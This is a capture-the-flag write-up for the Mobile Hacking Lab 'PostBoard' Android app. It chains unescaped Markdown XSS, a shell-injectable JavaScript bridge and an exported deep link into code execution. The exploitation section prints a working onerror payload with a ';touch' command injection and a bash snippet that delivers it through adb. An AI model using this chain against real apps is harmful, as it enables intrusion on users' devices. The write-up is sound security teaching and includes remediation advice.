---
title: "MHL PostBoard Writeup"
date: 2026-10-22
categories: [Mobile Hacking, Android]
tags: [android, mobile-hacking-lab, webview, xss, javascript-interface, command-injection, deep-link, rce]
---

**Platform:** Mobile Hacking Lab
**Target:** com.mobilehackinglab.postboard
**Category:** Android, WebView, XSS, Command Injection
**Outcome:** Remote code execution in the app's sandbox, triggered via an exported deep link, no physical interaction with the device required

## Summary

PostBoard is a "sticky note" message board app. Users type Markdown into a WebView, a Kotlin bridge method converts it to HTML and caches it, and the WebView renders the cache with `innerHTML`. The Markdown to HTML conversion never escapes HTML, so arbitrary tags and event handlers can be injected. The app also exposes a second bridge method, `postCowsayMessage`, that pipes its argument into `/bin/sh -c` without any quoting. Chaining these two issues turns a stored XSS into command execution: inject JavaScript via the unescaped `innerHTML` sink, use that JavaScript to call the cowsay bridge method with a shell metacharacter in the argument, and the shell runs a second, attacker-controlled command. The whole chain is reachable through an exported intent filter, so delivery needs nothing more than `adb shell am start` (or any other app that can fire the intent).

## Recon

Static analysis with jadx on the decompiled sources turned up three files worth reading closely:

- `MainActivity.java`, which sets up the WebView and handles a custom deep link
- `WebAppInterface.java`, the JavaScript bridge registered on the WebView
- `CowsayUtil.java`, which shells out to a bundled script

And the manifest:

```xml
<activity
    android:name="com.mobilehackinglab.postboard.MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data
            android:scheme="postboard"
            android:host="postmessage"/>
    </intent-filter>
</activity>
```

`exported="true"` plus a `VIEW` intent filter for `postboard://postmessage/...` means any app, or adb, can launch `MainActivity` with attacker controlled data and no permission check.

## Vulnerability 1: Stored XSS via unescaped Markdown rendering

`WebAppInterface.postMarkdownMessage` runs the input through a chain of regex replacements (bold, italics, headers, links, images, lists, and so on) and stores the resulting HTML string in a cache:

```java
String html3 = new Regex("!\\[(.*?)\\]\\((.*?)\\)").replace(html2, "<img src='$2' alt='$1'/>");
...
this.cache.addMessage(new Regex("^(---|\\*\\*\\*|___)$", RegexOption.MULTILINE).replace(html16, "<hr>"));
```

Nothing here escapes `<`, `>`, `"`, or `'`. Compare this with the other bridge method, `postCowsayMessage`, which does HTML escape its output before caching it, so the asymmetry is clearly a bug in the Markdown path rather than a deliberate design choice.

On the HTML side, `index.html` renders every cached message with `innerHTML`:

```javascript
messages.forEach(function(message) {
    var stickyNote = document.createElement('div');
    stickyNote.className = 'sticky-note';
    stickyNote.innerHTML = message;
    messageBoard.appendChild(stickyNote);
});
```

`innerHTML` does not execute injected `<script>` tags, but it does parse and run inline event handlers on injected elements. Posting:

```html
<img src=1 onerror=alert(1)>
```

produces a broken image, which fires `onerror`, which runs the JavaScript, confirming the sink.

## Vulnerability 2: Command injection in the cowsay bridge

```java
public final String runCowsay(String message) {
    String[] command = {"/bin/sh", "-c", CowsayUtil.scriptPath + ' ' + message};
    Process process = Runtime.getRuntime().exec(command);
    ...
}
```

`message` is concatenated directly into a string that is handed to `sh -c`. The shell parses that whole string before anything runs, so `;`, `&&`, `$()`, and similar characters are not treated as data, they are shell syntax. A message of `;touch somefile` turns one intended command into two:

```
/data/.../files/cowsay.sh ;touch somefile
```

`cowsay.sh` runs first (or fails harmlessly), then `touch somefile` runs regardless, as its own statement.

This method is reachable from JavaScript because it is annotated `@JavascriptInterface` and the interface is registered on the WebView:

```java
webView.addJavascriptInterface(new WebAppInterface(), "WebAppInterface");
```

## Vulnerability 3: Remote delivery via exported deep link

`MainActivity.handleIntent()` decodes the path segment of a `postboard://postmessage/<base64>` URI and feeds it straight into the Markdown bridge method through a `javascript:` URL:

```java
String message = StringsKt.replace$default(new String(bArrDecode, Charsets.UTF_8), "'", "\\'", false, 4, (Object) null);
...
activityMainBinding2.webView.loadUrl("javascript:WebAppInterface.postMarkdownMessage('" + message + "')");
```

The only transformation applied is escaping a literal `'` to `\'`. Two things make this not a real barrier:

- The base64 decode uses Android's `URL_SAFE` flag (`Base64.decode(path, 8)`), so standard base64 characters that would break the URI (`+`, `/`) need to be swapped for `-` and `_` first, but otherwise arbitrary bytes decode cleanly.
- Because the final string is a single-quoted JavaScript string literal, `\'` inside it is just an escaped quote character, it unescapes back to a literal `'` once the JavaScript engine parses it. So a payload built with real single quotes for its own JavaScript string arguments survives the round trip intact.

This means the entire XSS to RCE chain is reachable by any component on the device that can start an exported activity, with no in-app interaction beyond the message board re-rendering once.

## Exploitation

### Step 1: Confirm the XSS sink

Typed directly into the message box:

```html
<img src=1 onerror=alert(1)>
```

Fired immediately on post, confirming `innerHTML` executes event handler attributes on injected elements.

### Step 2: Build the RCE payload

The payload needs to survive three layers of parsing in order: HTML attribute, JavaScript string literal, and shell command line. Getting the quoting wrong at any layer either breaks the HTML tag, produces a JavaScript syntax error, or (if you are not careful on the attacker's own machine) injects into your own bash session instead of the target.

Final payload:

```html
<img src=1 onerror="window.WebAppInterface.postCowsayMessage(';touch /data/data/com.mobilehackinglab.postboard/files/id.txt')">
```

Layer by layer:

- `onerror="..."` is quoted, so the whole handler is treated as one attribute value instead of ending at the first space.
- The handler calls `postCowsayMessage` with a single quoted JavaScript string. The string starts with `';`, so the character sequence that reaches `runCowsay` is an empty cowsay argument, a statement separator, and then the real command.
- `touch /data/data/com.mobilehackinglab.postboard/files/id.txt` targets the app's own private data directory, which the app can write to and which can be read back for verification with `run-as`.

### Step 3: Deliver via the exported intent

```bash
PAYLOAD="<img src=1 onerror=\"window.WebAppInterface.postCowsayMessage(';touch /data/data/com.mobilehackinglab.postboard/files/id.txt')\">"
B64=$(printf '%s' "$PAYLOAD" | base64 -w0 | tr '+/' '-_' | tr -d '=')
adb shell am start -a android.intent.action.VIEW -d "postboard://postmessage/$B64"
```

Notes on this command:

- `base64 -w0` avoids line wrapping, which would otherwise break the URI.
- `tr '+/' '-_'` converts standard base64 to URL safe base64 to match the `URL_SAFE` flag used on the decode side.
- `tr -d '='` strips padding, which is not needed for `Base64.decode` with this flag and which would otherwise need URL encoding.

### Step 4: Trigger the render

`postMarkdownMessage` only writes to the cache, it does not touch the DOM. The DOM is only updated by `updateMessages()`, which runs on page load and on the Post button's `onclick`. The intent handler never calls it. So after sending the intent, the payload is stored but not yet rendered, a single tap on "Post Message" (with an empty textbox) triggers `updateMessages()`, which calls `getMessages()`, pulls the full cache including the injected payload, and renders it via `innerHTML` for the first time, firing the `onerror` handler.

### Step 5: Verify execution

```bash
adb shell run-as com.mobilehackinglab.postboard ls files/
```

```
cowsay.sh
id.txt
rList
```

`id.txt` did not exist before the payload fired. Its presence confirms the injected `touch` command executed inside the app's process, proving code execution reachable entirely from outside the app.

## Root causes

| Layer | Issue |
|---|---|
| Rendering | `innerHTML` used on content built from unescaped user input |
| Markdown conversion | Regex based conversion never HTML escapes the source text |
| Bridge design | `@JavascriptInterface` method exposes a raw command execution primitive to page JavaScript |
| Command execution | User controlled string concatenated into `sh -c "..."` instead of passed as a discrete argument |
| Attack surface | Exported activity with an intent filter feeds untrusted data into the same vulnerable sink, removing any need for physical or in-app interaction |

## Remediation

- **Escape before rendering.** Either escape HTML entities before writing into `innerHTML`, or avoid `innerHTML` entirely for untrusted content and use `textContent`, or a Markdown renderer that escapes raw HTML by default (most do, unless explicitly configured otherwise).
- **Avoid shell string concatenation.** Use `ProcessBuilder` with a `List<String>` of arguments instead of `Runtime.exec(new String[]{"/bin/sh", "-c", ...})`. This passes the message as a single argument to the target program rather than as shell syntax, removing the injection class entirely.
- **Minimize the JavaScript bridge surface.** Any `@JavascriptInterface` method is reachable by anything that can get script execution in that WebView, including third party content if it is ever loaded. A method that results in arbitrary command concatenation should not exist on a bridge reachable from page content.
- **Treat exported intent filters as untrusted input boundaries.** Data arriving through an exported `VIEW` intent should go through the same validation as data from an external network source, not be handed straight to `loadUrl("javascript:...")`.

## Chain recap

1. Exported `postboard://postmessage` intent filter accepts attacker controlled base64 data with no validation.
2. The decoded string reaches `postMarkdownMessage`, whose HTML output is never escaped.
3. The WebView renders cached messages with `innerHTML`, executing the injected event handler.
4. The injected JavaScript calls the exposed `postCowsayMessage` bridge method with a crafted argument.
5. `runCowsay` concatenates that argument unescaped into `sh -c`, so the shell parses it as two separate commands.
6. The second command executes with the app's privileges, proven by a file written into the app's private data directory.
